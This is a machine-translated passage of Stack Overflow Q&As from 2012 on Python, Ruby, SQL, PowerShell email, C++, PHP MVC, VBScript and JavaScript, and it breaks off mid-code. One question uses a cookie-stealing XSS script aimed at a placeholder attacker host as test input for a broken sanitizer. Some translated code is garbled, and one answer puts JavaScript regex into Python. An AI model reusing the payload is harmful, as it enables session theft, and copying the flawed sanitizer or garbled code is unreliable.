`heapq.merge()`如果标准库中有，为什么要自己滚动？不幸的是，它没有提供一个关键的论点——你必须自己做装饰 - 合并 - 不装饰的舞蹈：

```
from itertools import imap
from operator import itemgetter
import heapq

def extract_timestamp(line):
    """Extract timestamp and convert to a form that gives the
    expected result in a comparison
    """
    return line.split()[1] # for example

with open("log1.txt") as f1, open("log2.txt") as f2:
    sources = [f1, f2]
    with open("merged.txt", "w") as dest:
        decorated = [
            ((extract_timestamp(line), line) for line in f)
            for f in sources]
        merged = heapq.merge(*decorated)
        undecorated = imap(itemgetter(-1), merged)
        dest.writelines(undecorated) 
```

上面的每一步都是“偷懒”的。因为我避免`file.readlines()`根据需要读取文件中的行。同样，使用生成器表达式而不是列表组合的装饰过程。`heapq.merge()`也是懒惰的——每个输入迭代器需要一个项目同时进行必要的比较。最后，我使用`itertools.imap()`了内置的 map() 的惰性变体来取消装饰。

（在 Python 3 中 map() 变得懒惰了，所以你可以使用它）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T14:04:45.410

您想实现基于文件的[合并排序](http://en.wikipedia.org/wiki/Merge_sort)。从两个文件中读取一行，输出旧行，然后从该文件中读取另一行。一旦其中一个文件用完，从另一个文件中输出所有剩余的行。

# ruby-on-rails - 从哈希中检索数据的注入方法

> ID：12460945
> 
> 赞同：0
> 
> 时间：2012-09-17T14:02:17.143
> 
> 标签：ruby-on-rails

我无法在我的用户模型中获取以下方法来处理我从 LinkedIn 获取的用于用户登录的哈希（'auth'）：

```
def self.deep_get auth, *fields
    auth.inject(auth) { |acc, e| acc[e] if acc }
end 
```

当我使用omniauth/linkedin gem 创建用户时，我稍后会在我的用户模型中调用“deep_get”方法。但是，它为我知道不是 nil 的 provider/uid/headline/email 用户字段返回 nil 值。

我将 first_name 和 last_name 字段作为示例，因为这种方法有效（不返回 nil 值），但是（据我所知）错误的样式/异常处理。关于为什么我的 deep_get 注入方法无法按照我的意愿检索散列中的数据的任何想法？

```
def self.create_from_omniauth(auth)

      create! do |user|

        # i'd like to retrieve user information from linkedin per the following with my inject method, but i am getting nil values when i should be getting data.

        # :provider and :uid are on the same branch level of data. first_name,last_name,email,etc. are on a branch just below called 'info' 

        user.provider = deep_get(auth, :provider)
        user.uid = deep_get(auth, :uid)
        user.headline = deep_get(auth, :info, :headline)
        user.email = deep_get(auth, :info, :email)

        # the below is working but i know pokemon exception handling is not good style. 

        begin
          user.first_name = auth["info"]["first_name"]
        rescue
        end

        begin
          user.last_name = auth["info"]["last_name"]
        rescue
        end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T14:17:10.970

尝试这个

```
def deep_find(obj,key)
  if obj.respond_to?(:key?) && obj.key?(key)
     obj[key]
  elsif obj.respond_to?(:each)
     r = nil
     obj.find{ |*a| r=deep_find(a.last,key) }
     r
  end
end
or try this
class Hash
  def deep_fetch(key, default = nil)
    default = yield if block_given?
    (deep_find(key) or default) or nil
  end

  def deep_find(key)
    if key?(key)
      self[key]
    else  
      self.values.inject(nil) do |memo, v|             
        memo = v.deep_find(key) if v.respond_to?(:deep_find)       
        memo unless memo.nil?  
      end 
    end     
  end
end 
```

# sql - 统计每天玩数据库游戏的用户

> ID：12460948
> 
> 赞同：1
> 
> 时间：2012-09-17T14:02:36.943
> 
> 标签：sql

我有一个带有表格答案的小游戏的数据库：每个用户每天最多可以玩和回答 2 次，表格答案的结构如下：

`UID | ANSWER | DATE`

我想做一个查询，以获取每天至少玩一次的用户数量。我做了这样的事情，但这不起作用。

```
SELECT Day(date) as n, 
       Dayname(date) as m, 
       uid,             
       COUNT(uid) as c 
FROM answers
WHERE Year(date) = '2012' 
GROUP BY uid HAVING count( * ) <=2 //COUNT user who played at least 2 times per day
GROUP BY n //group by day
ORDER BY n 
```

我想得到这样的结果：

`Friday | 9-5-2012 | 1254`

`Saturday | 10-5-2012 | 1427` ...

任何帮助表示赞赏...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T14:06:02.550

不要使用两个`group by`子句，而是使用一个按天分组的子句：

```
select  day(date) as d
,       month(date) as m
,       count(distinct uid) as c 
from    answers
where   year(date) = '2012' 
group by 
        day(date)
,       month(date)
having  count(*) > 1 
```

# powershell - 如何将凭据传递给 Send-MailMessage 命令以发送电子邮件

> ID：12460950
> 
> 赞同：43
> 
> 时间：2012-09-17T14:02:43.640
> 
> 标签：powershell

我在将凭据传递给`Send-MailMessage`命令时遇到困难

这就是我正在运行的：

```
Send-MailMessage -smtpServer smtp.gmail.com -from 'myself@gmail.com' `
    -to 'myself@gmail.com' -subject 'Test' -attachment C:\CDF.pdf 
```

它在消息下方出错，这显然是因为我没有通过我的 gmail 凭据

```
Send-MailMessage : The SMTP server requires a secure connection or the client was not
authenticated. The server response was: 5.7.0 Must issue a STARTTLS command first. 
```

我google了一下，也浏览了man page，`Send-MailMessage`发现需要传递“-credential”参数。

我的问题是：如何？

我尝试使用 Get-Credentials，如下所示：

```
$mycredentials = Get-Credential 
```

然后在弹出的框中输入我的 gmail 用户名和密码。

然后我运行以下命令：

```
Send-MailMessage -smtpServer smtp.gmail.com -credentail $mycredentials `
  -from 'myself@gmail.com' -to 'myself@gmail.com' -subject 'Test' -attachment C:\CDF.pdf 
```

仍然失败并出现完全相同的错误。

所以我需要你们帮助我如何将我的凭据传递给`Send-MailMessage`命令。我了解了 PScredentials，但不确定它是什么以及如何在这种情况下使用它。

* * *

## 回答 #1

> 赞同：47
> 
> 时间：2012-09-17T16:01:37.197

我找到了这个博客站点：[Adam Kahtava](http://adam.kahtava.com/journal/2010/01/19/sending-email-with-attachments-in-powershell/)
我还发现了这个问题：[send-mail-via-gmail-with-powershell-v2s-send-mailmessage](https://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage)
问题是，它们都没有满足您的需求（带密码的附件），所以我将两者结合起来并提出了这个：

```
$EmailTo = "myself@gmail.com"
$EmailFrom = "me@mydomain.com"
$Subject = "Test" 
$Body = "Test Body" 
$SMTPServer = "smtp.gmail.com" 
$filenameAndPath = "C:\CDF.pdf"
$SMTPMessage = New-Object System.Net.Mail.MailMessage($EmailFrom,$EmailTo,$Subject,$Body)
$attachment = New-Object System.Net.Mail.Attachment($filenameAndPath)
$SMTPMessage.Attachments.Add($attachment)
$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587) 
$SMTPClient.EnableSsl = $true 
$SMTPClient.Credentials = New-Object System.Net.NetworkCredential("username", "password"); 
$SMTPClient.Send($SMTPMessage) 
```

由于我喜欢为事物制作函数，并且我需要我能得到的所有练习，所以我继续写了这个：

```
Function Send-EMail {
    Param (
        [Parameter(`
            Mandatory=$true)]
        [String]$EmailTo,
        [Parameter(`
            Mandatory=$true)]
        [String]$Subject,
        [Parameter(`
            Mandatory=$true)]
        [String]$Body,
        [Parameter(`
            Mandatory=$true)]
        [String]$EmailFrom="myself@gmail.com",  #This gives a default value to the $EmailFrom command
        [Parameter(`
            mandatory=$false)]
        [String]$attachment,
        [Parameter(`
            mandatory=$true)]
        [String]$Password
    )

        $SMTPServer = "smtp.gmail.com" 
        $SMTPMessage = New-Object System.Net.Mail.MailMessage($EmailFrom,$EmailTo,$Subject,$Body)
        if ($attachment -ne $null) {
            $SMTPattachment = New-Object System.Net.Mail.Attachment($attachment)
            $SMTPMessage.Attachments.Add($SMTPattachment)
        }
        $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587) 
        $SMTPClient.EnableSsl = $true 
        $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($EmailFrom.Split("@")[0], $Password); 
        $SMTPClient.Send($SMTPMessage)
        Remove-Variable -Name SMTPClient
        Remove-Variable -Name Password

} #End Function Send-EMail 
```

要调用它，只需使用以下命令：

```
Send-EMail -EmailTo "Myself@gmail.com" -Body "Test Body" -Subject "Test Subject" -attachment "C:\cdf.pdf" -password "Passowrd" 
```

我知道像这样简单地输入密码是不安全的。我会看看我是否能想出更安全的东西并在以后更新，但至少这应该能让你得到开始所需的东西。有一个伟大的一周！

编辑：`$EmailFrom`根据 JuanPablo 的评论添加

编辑： SMTP 在附件中拼写为 STMP。

* * *

## 回答 #2

> 赞同：22
> 
> 时间：2019-01-10T13:33:07.307

这是一个简单`Send-MailMessage`的用户名/密码示例，供任何人使用

```
$secpasswd = ConvertTo-SecureString "PlainTextPassword" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("username", $secpasswd)
Send-MailMessage -SmtpServer mysmptp -Credential $cred -UseSsl -From 'sender@gmail.com' -To 'recipient@gmail.com' -Subject 'TEST' 
```

* * *

## 回答 #3

> 赞同：17
> 
> 时间：2016-06-06T09:57:18.327

我花了一些时间来整合所有东西，让它变得有点安全，并让它与 Gmail 一起使用。我希望这个答案可以节省一些时间。

**使用加密的服务器密码创建一个文件：**

在 Powershell 中，输入以下命令（将 myPassword 替换为您的实际密码）：

```
"myPassword" | ConvertTo-SecureString -AsPlainText -Force | ConvertFrom-SecureString | Out-File "C:\EmailPassword.txt" 
```

**创建一个 powershell 脚本（例如 sendEmail.ps1）：**

```
$User = "usernameForEmailPassword@gmail.com"
$File = "C:\EmailPassword.txt"
$cred=New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User, (Get-Content $File | ConvertTo-SecureString)
$EmailTo = "emailTo@yahoo.com"
$EmailFrom = "emailFrom@gmail.com"
$Subject = "Email Subject" 
$Body = "Email body text" 
$SMTPServer = "smtp.gmail.com" 
$filenameAndPath = "C:\fileIwantToSend.csv"
$SMTPMessage = New-Object System.Net.Mail.MailMessage($EmailFrom,$EmailTo,$Subject,$Body)
$attachment = New-Object System.Net.Mail.Attachment($filenameAndPath)
$SMTPMessage.Attachments.Add($attachment)
$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587) 
$SMTPClient.EnableSsl = $true 
$SMTPClient.Credentials = New-Object System.Net.NetworkCredential($cred.UserName, $cred.Password); 
$SMTPClient.Send($SMTPMessage) 
```

**使用任务计划程序自动化：**

使用以下内容创建一个批处理文件（例如 emailFile.bat）：

```
powershell -ExecutionPolicy ByPass -File C:\sendEmail.ps1 
```

创建一个任务来运行批处理文件。**注意：您必须使用与加密密码相同的用户帐户运行任务！（又名，可能是登录用户）**

就这样; 您现在可以使用 Windows 任务计划程序和 Powershell 自动发送和安排发送电子邮件和附件。没有第 3 方软件，并且密码不是以纯文本形式存储的（尽管被授予，但也不是非常安全）。

您还可以阅读[这篇文章](http://www.adminarsenal.com/admin-arsenal-blog/secure-password-with-powershell-encrypting-credentials-part-1/)，了解这为您的电子邮件密码提供的安全级别。

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2013-09-21T03:36:48.840

> PSH> $cred = 获取凭据
> 
> PSH> $信用| 导出 CliXml c:\temp\cred.clixml
> 
> PSH> $cred2 = Import-CliXml c:\temp\cred.clixml

这会将它与您的 SID 和机器的 SID 进行哈希处理，因此该文件在任何其他机器上或在其他任何人的手中都是无用的。

* * *

## 回答 #5

> 赞同：7
> 
> 时间：2012-09-17T16:10:40.080

所以..这是 SSL 问题。我所做的一切都是绝对正确的。只是我没有使用 ssl 选项。所以我在我的原始命令中添加了“-Usessl true”并且它起作用了。

* * *

## 回答 #6

> 赞同：5
> 
> 时间：2014-04-05T04:36:23.940

除了 UseSsl 之外，您还必须包含 smtp 端口 587 才能使其工作。

```
Send-MailMessage -SmtpServer smtp.gmail.com -Port 587 -Credential $credential -UseSsl -From 'yyy@gmail.com' -To 'xxx@email.com' -Subject 'TEST' 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2021-09-17T15:07:15.043

除了其他答案，我想指出，如果您有两个因素身份验证，您将需要在您的谷歌帐户上创建一个应用程序密码。

有关详细说明： https: [//support.google.com/accounts/answer/185833](https://support.google.com/accounts/answer/185833)

# python - 为什么功能不起作用？尝试替换字符串中的单词

> ID：12460959
> 
> 赞同：2
> 
> 时间：2012-09-17T14:03:07.500
> 
> 标签：python, string

我正在尝试替换字符串中的一些关键词。这是我的功能：

```
def clean_code(input):
    input.replace('<script>', " ")
    input.replace('</script>', " ")
    input.replace('<a href>', " ")
    input.replace('</a>', " ")
    input.replace('>', "&gt;")
    input.replace('>', "&lt;")
    return input 
```

这是我的其他代码和字符串：

```
string1 = "This blog is STUPID! >\n" \
"<script>document.location='http://some_attacker/cookie.cgi?"\
" +document.cookie </script>"

print '\nstring1 cleaned of code' 
print '------------------------'
print clean_code(string1) 
```

我的输出如下，我不确定为什么什么都没有改变

```
string1 cleaned of code
------------------------
This blog is STUPID! >
<script>document.location='http://some_attacker/cookie.cgi? +document.cookie </script> 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-17T14:05:10.760

Python 字符串是**不可变**的：

```
input = input.replace('<script>', " ")
input = ... 
```

请参阅[`replace`文档](http://docs.python.org/library/string.html#string.replace)：

> **返回字符串 str 的副本，**其中所有出现的子字符串 old 都替换为 new。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-09-17T14:06:23.600

字符串在 Python 中是不可变的。 `input.replace('</a>', " ")`不改变`input`。您需要将结果分配回`input`.

但实际上你应该使用像~~[BeautifulSoup](http://www.crummy.com/software/BeautifulSoup/)~~ [lxml](http://lxml.de/)这样的解析器。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-09-17T14:10:21.937

`String.replace`返回一个作为替换结果的新字符串，但不更改原始字符串。为此，您必须将返回值分配回变量，如下所示：

```
myString = myString.replace("foo", "bar") 
```

此外，`input.replace('<a href>', " ")`只会替换*确切的*子字符串“<a href>”。要删除实际链接，请尝试`input.replace(/<a\s[^>]*>/, " ")`.

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-09-17T14:05:13.587

`.replace`不是就地突变

尝试这个

```
def clean_code(input):
    for tokens in [('<script>', " "),('</script>', " "),('<a href>', " "),
                ('</a>', " "),('>', "&gt;"),('>', "&lt;")]:
        input = input.replace(tokens[0], tokens[1])
    return input 
```

# c++ - 模板继承

> ID：12460960
> 
> 赞同：0
> 
> 时间：2012-09-17T14:03:09.053
> 
> 标签：c++, templates, inheritance, constructor

我有一个 C++ 中的类模板和另一个继承它的类。正如您将看到的，后者不是类模板。当我尝试通过调用基类的构造函数（模板之一）来定义派生类的构造函数时，就会出现问题。我已经在代码下方发布了错误。

为简单起见，我只添加了声明。如果您觉得代码可以帮助您了解问题可能是什么，我很乐意发布它。

state2d.h

```
#ifndef STATE2D_H
#define STATE2D_H

template <typename T>
class State2D
{
public:
    State2D(unsigned int _rows, unsigned int _columns);
    State2D(unsigned int _rows, unsigned int _columns, const T& val);
    State2D(const State2D<T> &st);
    ~State2D();
    T& operator()(unsigned int i, unsigned int j);
    const T& operator()(unsigned int i, unsigned int j) const;
    unsigned int GetRowCount() const;
    unsigned int GetColumnCount() const;
    unsigned int GetAvailablePositionsCount() const;

protected:
    T** matrix;
    unsigned int rows;
    unsigned int columns;
    unsigned int availablePositions;
};

#endif // STATE2D_H 
```

井字游戏状态.h

```
#ifndef TICTACTOESTATE_H
#define TICTACTOESTATE_H

#include "state2d.h"

class TicTacToeState : public State2D<char>
{
public:
    TicTacToeState();
};

#endif // TICTACTOESTATE_H 
```

井字游戏状态.cpp

```
#include "tictactoestate.h"

TicTacToeState::TicTacToeState() : State2D(3,3,' ') // ERROR here; see below
{
} 
```

> 错误：类 'TicTacToeState' 没有任何名为 'State2D' 的字段 错误：没有用于调用 'State2D::State2D()' 的匹配函数 候选者是：State2D::State2D(const State2D&) [with T = char] State2D: :State2D(unsigned int, unsigned int, const T&) [with T = char] State2D::State2D(unsigned int, unsigned int) [with T = char]

有任何想法吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-09-17T14:06:27.217

```
: State2D<char>(3,3,' ') 
```

也许？

# ruby-on-rails - Rails 和 bash_profile

> ID：12460961
> 
> 赞同：0
> 
> 时间：2012-09-17T14:03:09.173
> 
> 标签：ruby-on-rails, macos

我刚刚在 mac os 中添加了 highligh 到我的终端，编辑 .bash_profile 并添加了这个：

```
export CLICOLOR=1
export LSCOLORS=GxFxCxDxBxegedabagaced 
```

并且在这样做之后rails开始失败，我无法运行“rails c”或“rails s”，我确定它与这个变化有关，也许我删除了其他东西......

我的 .bash_profile 只有我在那里展示的那两行......

任何的想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T17:48:41.453

只是一个疯狂的猜测：你确定你没有`.bash_profile`错误地删除以前的内容吗？

# html - 块文本旁边的图像

> ID：12460963
> 
> 赞同：0
> 
> 时间：2012-09-17T14:03:17.280
> 
> 标签：html, css, drop-down-menu, menu, block

[查看http://marckmann.se/](http://marckmann.se/)上的菜单链接“Produkter” 我想在某些项目的下拉菜单的右侧添加一个箭头图像。但由于文本被设置为块，它不会允许我。有什么办法可以解决这个问题吗？

谢谢 ：）！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T14:09:41.973

在您的 CSS 中，对于`#dropdown div a`规则，添加流动的：

```
background: url('http://www.phillipsdepury.com/imgs/nav/arrow_small_left.gif') no-repeat right center;}
padding-right: 20px; 
```

替换您自己的箭头图像。还将 20px 替换为（图像宽度 + 5）px ...

# php - 在 MVC/OOP 结构中处理表单数据

> ID：12460967
> 
> 赞同：0
> 
> 时间：2012-09-17T14:03:34.213
> 
> 标签：php, oop, model-view-controller

我已经创建了一个登录系统，并且我试图尽可能地遵守 MVC 的规则。

我有一个简单的登录表单，它使用 AJAX 将表单数据提交给小脚本，然后调用控制器来处理用户名和密码：

```
function __autoload($classname) {
    include("../classes/$classname.php");
}

$username = $_POST['username'] ;
$password = $_POST['password'] ;

$AC = new AccessControl ;

$result = $AC->login($username, $password) ;

if($result !== 0)
{
echo $result ;
exit() ;
} 
```

AccessControl 是我的用户认证和帐户管理操作类，代码在我的另一篇文章中：[MVC 关系和 DRY](https://stackoverflow.com/questions/12459104/mvc-relationships-and-dry)

我做错了吗，因为这个小脚本不是控制器或模型？它所做的只是将控制器返回的信息传递回接口/视图，例如错误消息。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:09:06.120

首先，不要让任何特定范式阻止您*在特定情况下*以最佳方式做事。

也就是说，您的小脚本*是*一个控制器。它正在处理一个动作并返回一个结果。它可能不是管理特定视图，而是委派处理并将结果交给视图。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T14:19:12.437

在我看来，没有使用MVC structre到血，这是正确的，有一些小的变化。

我通常喜欢这样的东西：

```
$AC = new AccessControl ;
$AC->setUsername($_POST['username']);
$AC->setPassword($_POST['password']);
if ( $AC->login() )
     echo $result // if all is ok from login method return true
else
     // manage some error handling here if not true 
```

也许您想在更多地方和其他方法中使用该用户名和密码，因此您可以使用`getPassword()`/`getUsername()`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-22T01:46:14.667

您正在混合身份验证和授权。像这样的结构`AccessControl`应该处理授权，而不是身份验证..您选择的名称.. emm ...留下了改进的空间。要了解**有关 MVC 上下文中的授权**的更多信息，我建议阅读[这篇文章](https://stackoverflow.com/a/9685039/727208)。

在 MVC 和 MVC 启发的设计模式的上下文中，身份验证应该是模型层的一部分，并由某种形式的*识别服务*处理。

* * *

您在代码剪辑器上的内容看起来像是控制器方法中的机器人代码，但它有几个问题。

好的..让我们分开编码：

*   `__autoload()`不推荐使用函数。相反，您应该学习如何利用[`spl_autoload_register()`](http://php.net/manual/en/function.spl-autoload-register.php)函数。它可以让您编写代码以使用多个领导者。

    此外，从 5.3 版本开始，可以在 PHP中使用[命名空间。](http://php.net/manual/en/language.namespaces.php)结合自动加载器，它可以让你更好地组织你的代码。最近，将项目目录结构（至少部分）映射到命名空间是一种常见的做法。

    最著名的实现是[PSR-0](https://github.com/php-fig/fig-standards/blob/master/accepted/PSR-0.md)，尽管它甚至不应该被认为接近理想。它有一些严重的缺陷，但它将成为一个很好的例子来说明在自动加载中使用命名空间。

*   您应该避免`new`在应用程序调用图中使用 deep。这会导致与您从中创建新实例的类的名称紧密耦合。

    相反，您的控制器应该有一个工厂注入到构造函数中，然后负责初始化新实例。

    ```
    namespace Controller;

    class Foo
    {
        protected $serviceFactory = null;
        protected $view = null;

        // --- SNIP ---
        public function __construct( HasSomeFactoryInterface $factory, $view )
        {
            $this->serviceFactory = $factory;
            $this->view = $view;
        }

        public function postLogin( $request )
        {
            $recognition = $this->serviceFactory->create('AccessControl');

            // --- SNIP ---

    } 
    ```

*   MVC 设计模式中的控制器应该只改变模型层和当前视图的状态。它不返回任何内容，也不将数据从模型层传递到视图。您似乎混淆了经典 MVC、Model2 MVC、MVP、MVVP 和 MVC 模式的 Rails 模仿。

    在 Model2 MVC（也称为 Web MVC）设计模式中，控制器接收传入的用户请求，并通过将来自所述请求的数据传递到三元组的各个部分来更改它们的状态。

    ```
    namespace Controller;

    class Foo
    {

        // --- SNIP ---
        public function postLogin( $request )
        {
            $recognition = $this->serviceFactory->create('AccessControl');
            $recognition->login( $request->getPost( 'username' ),
                                 $request->getPost( 'password' ) );

            $this->view->prepare( $request->getMethod() );
        }
        // --- SNIP ---

    } 
    ```

    在这个示例中，视图接收到请求已收到的通知，`POST`这意味着，它不必从多个模板生成 HTML，而只需发送 HTTP 标头作为响应。

    要查看有关 MVC 相关模式的简短概述，请尝试[这篇文章](https://stackoverflow.com/a/11878502/727208)。

*   如果您的目标是 Model2 MVC 设计模式，则视图应自行从模型层检索信息。但是所有受 MVC 启发的设计模式视图都应该负责表示逻辑。

    这还包括处理模型层中的错误状态。领域业务逻辑与视图如何表示错误无关。

# android - 单击按钮时如何赋予上滑效果

> ID：12460969
> 
> 赞同：1
> 
> 时间：2012-09-17T14:03:42.353
> 
> 标签：android, android-layout, android-intent, android-widget

我的客户告诉我要提供一些效果，例如当我们单击按钮时，我的覆盖层应该会出现上滑效果。如果您需要这种上滑效果的示例，那么它是：此应用程序中的[Expedia Hotels](https://play.google.com/store/apps/details?id=com.expedia.bookings&feature=search_result#?t=W251bGwsMSwxLDEsImNvbS5leHBlZGlhLmJvb2tpbmdzIl0.)上拉效果已用于我猜按钮单击事件。我想在原生 android 应用程序中做

有任何帮助

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:09:29.497

您可能想在此处阅读动画指南：http: [//developer.android.com/guide/topics/graphics/overview.html](http://developer.android.com/guide/topics/graphics/overview.html)

动画可以分配给几乎所有东西，主要是 ViewFlippers 和 Fragment Transactions。

# email - VBScript 在没有隐藏字段的情况下发送两次，但从不使用它。需要帮助发送电子邮件

> ID：12460970
> 
> 赞同：0
> 
> 时间：2012-09-17T14:03:46.657
> 
> 标签：email, asp-classic, vbscript

好的，所以我的问题是这个。我有一个简单的 vbscript，可以在提交表单时发送电子邮件。当它在如下代码中时，如果发送电子邮件（我在收件箱中收到电子邮件）不可取两次：页面加载时一次，提交时一次：

```
<% Sub sendEmail(mailFrom, mailTo, mailSubject, mailMessage, mailServer, mailUsername, mailPassword)
Set MyMail = CreateObject("cdo.message")
MyMail.From = mailFrom
MyMail.To = mailTo
MyMail.Subject = mailSubject
MyMail.HTMLBody = mailMessage
MyMail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2
MyMail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = mailServer
MyMail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendusername") = mailUsername
MyMail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendpassword") = mailPassword
MyMail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1
MyMail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 25
MyMail.Configuration.Fields.Update
MyMail.Send
Set MyMail = nothing
End Sub

Dim mailFrom, mailTo, mailSubject, mailMessage, mailServer, mailUsername, mailPassword

mailFrom = "example"
mailTo = "example"
mailSubject = "Email test"
mailMessage = "<html><body>example</body><html>"
mailServer = "example"
mailUsername = "example"
mailPassword = "example"

Call sendEmail(mailFrom, mailTo, mailSubject, mailMessage, mailServer, mailUsername, mailPassword)%> 
```

所以我想我必须做这样的事情，所以它只发送一次。在提交按钮下的表单中添加一个隐藏字段，并将代码编辑为此。唯一的问题是，当我这样做时，表单似乎可以正确提交并且没有发生错误，但我的收件箱中从来没有收到电子邮件！任何帮助将不胜感激。我在这方面不是最好的，我还在学习！：

```
<% if request.form("isSubmitted") = "yes" then
Sub sendEmail(mailFrom, mailTo, mailSubject, mailMessage, mailServer, mailUsername, mailPassword)
Set MyMail = CreateObject("cdo.message")
MyMail.From = mailFrom
MyMail.To = mailTo
MyMail.Subject = mailSubject
MyMail.HTMLBody = mailMessage
MyMail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2
MyMail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = mailServer
MyMail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendusername") = mailUsername
MyMail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendpassword") = mailPassword
MyMail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1
MyMail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 25
MyMail.Configuration.Fields.Update
MyMail.Send
Set MyMail = nothing
End Sub

Dim mailFrom, mailTo, mailSubject, mailMessage, mailServer, mailUsername, mailPassword

mailFrom = "example"
mailTo = "example"
mailSubject = "Email test"
mailMessage = "<html><body>example</body><html>"
mailServer = "example"
mailUsername = "example"
mailPassword = "example"

Call sendEmail(mailFrom, mailTo, mailSubject, mailMessage, mailServer, mailUsername, mailPassword)
end if %> 
```

编辑＃1：这是我的隐藏字段（我也将隐藏字段放在提交按钮后无济于事。）

```
<input type="hidden" name="isSubmitted" id="isSubmitted" value="yes" /> 
<input type="submit" name="btnSubmit" id="btnSubmit" value="Submit" class="submit" /> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:21:17.303

您确定您的表单正在执行 POST 而不是 GET 吗？如果是 GET 请求，则需要 request.querystring("isSubmitted")

我还将检查放在一个函数中。

```
Function IsSubmit()
    'IsSubmit= (request.form("isSubmitted") = "yes") 'Edited for more generic solution
    IsSubmit = (Request.ServerVariables("REQUEST_METHOD") = "POST")
End Function 
```

然后你可以在你的代码中使用 __ if IsSubmit() then __

# node.js - 如何通过 SockJS（websocket）与 NodeJS 持久/持久连接？

> ID：12460973
> 
> 赞同：0
> 
> 时间：2012-09-17T14:03:59.713
> 
> 标签：node.js, session, sockjs

在用户重新加载页面期间，在通过 SockJS（websocket）连接的 NodeJS 中管理连接以持久（不断开连接）一段时间的最佳解决方案是什么？

我可以通过会话做到这一点吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T15:02:11.720

当用户重新加载（或离开）网页时，SockJS、本机 websocket 和浏览器维护的所有资源都会被释放。缓存、本地存储（和朋友）和 cookie 是明显的例外。

如果您希望在打开页面时建立 SockJS 连接 - 那么，您需要在打开页面时建立连接。

SockJS 非常快，即使您有大量的短期连接，它也能正常工作。

（顺便说一句，看看使用 websockets 的 web worker）

# javascript - 绘制 100 个带有 ID 的圆圈并将鼠标事件与它们相关联

> ID：12460983
> 
> 赞同：1
> 
> 时间：2012-09-17T14:04:48.470
> 
> 标签：javascript, jquery, jquery-ui, d3.js, kineticjs

> **可能重复：**
> [简单任务（SVG 与 Canvas）](https://stackoverflow.com/questions/12464788/simple-task-svg-vs-canvas)

我正在尝试绘制/绘制许多圆圈，并希望在鼠标悬停或单击鼠标时使用 ID 来识别它们。我试图使用 KineticJS 来做到这一点，因为我是 javascript 的初学者，所以无法实现。

除此之外，我只想捕获正常的鼠标事件（左/右键单击），并且除了鼠标事件之外不会移动或玩这些圆圈。KineticJS 也是正确的库。使用？Raphael JS/d3 等怎么样。{任何机会都可以通过 Jquery/Dojo 轻松实现）唯一重要的是绘制大量圆圈，能够唯一地识别它们并将鼠标事件与它们相关联。

PS：是的，我还想完成放大/缩小绘制这些圆圈的空间/画布的能力。

请建议。提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T16:44:19.193

试试下面的代码，你可以在圆圈上通过鼠标移动找到圆圈ID

```
<!DOCTYPE HTML>
<html>
  <head>
    <style>
      body {
        margin: 0px;
        padding: 0px;
      }
      canvas {
        border: 1px solid #9C9898;
      }
    </style>
    <script src="http://www.html5canvastutorials.com/libraries/kinetic-v4.0.1.js"></script>
    <script>
      window.onload = function() {
        var stage = new Kinetic.Stage({
          container: 'container',
          width: 578,
          height: 200
        });
        var circlesLayer = new Kinetic.Layer();
        var tooltipLayer = new Kinetic.Layer();
        var colors = ['red', 'orange', 'yellow', 'green', 'blue', 'cyan', 'purple'];
        var colorIndex = 0;

        var circleId ;

        for(var n = 0; n < 100; n++) {( function() {
            var i = n;
            var color = colors[colorIndex++];
            if(colorIndex >= colors.length) {
              colorIndex = 0;
            }
            circleId = "CircleID_" + i;
            var randX = Math.random() * stage.getWidth();
            var randY = Math.random() * stage.getHeight();
            var circle = new Kinetic.Circle({
              x: randX,
              y: randY,
              radius: 10,
              fill: color,draggable:true,
              id:circleId
            });

            circle.on('mousemove', function() {
              // update tooltip
              var mousePos = stage.getMousePosition();
              tooltip.setPosition(mousePos.x + 5, mousePos.y + 5);
              tooltip.setText('ID: ' + stage.get("#CircleID_" + i)[0].attrs.id);
              tooltip.show();
              tooltipLayer.draw();
            });

            circle.on('mouseout', function() {
              tooltip.hide();
              tooltipLayer.draw();
            });

            circlesLayer.add(circle);
          }());
        }
        var tooltip = new Kinetic.Text({
          text: '',
